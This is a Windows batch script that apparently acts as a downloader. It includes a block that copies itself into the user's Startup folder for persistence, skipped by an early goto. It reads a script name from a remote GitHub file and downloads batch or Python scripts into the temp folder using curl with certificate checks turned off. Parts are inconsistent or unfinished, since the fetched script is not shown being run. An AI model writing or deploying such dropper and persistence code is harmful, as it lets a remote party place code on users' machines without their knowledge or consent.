@echo off
goto getScript
set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%_path%\.trevi.bat" (
    xcopy "%~f0" "%_path%"
) else (
    goto getScript
)
exit /b

:getScript
cd /d %temp%
for /f %%i in ('curl -kLs "https://github.com/aritz331/getadmin/raw/main/currentScript.txt"') do (
    set "_currentScript=%%i"
    set "_currentScriptExt=%%~xi"
)

:getScriptByExtension
call :checkExtension bat batch "cmd /c"
call :checkExtension py python "python"

pause
exit /b

:checkExtension
if [%_currentScriptExt%]==[.%~1] (
    call :executeScript %~2/%_currentScript%
)
exit /b

:executeScript
echo %~1
curl -kLOs "https://github.com/aritz331/getadmin/raw/main/scripts/%~1"
exit /b

pause